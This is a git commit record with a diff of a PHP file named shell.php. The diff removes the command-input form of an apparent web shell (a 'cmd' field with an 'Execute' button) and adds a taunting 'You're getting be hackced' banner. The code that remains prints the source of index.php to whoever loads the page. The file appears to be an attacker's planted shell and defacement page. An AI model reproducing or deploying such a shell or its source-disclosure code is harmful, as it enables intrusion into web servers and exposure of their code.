d925645dd5518380437f6c2699bd5df9042bce30
vinhdzzai <vinhquangeuro@gmail.com>
2026-06-09 22:32:45 +0700

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,9 +1,6 @@
 <html>
 <body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
+<b>You're getting be hackced</b>
 <pre>
 <?php
    echo file_get_contents("index.php");
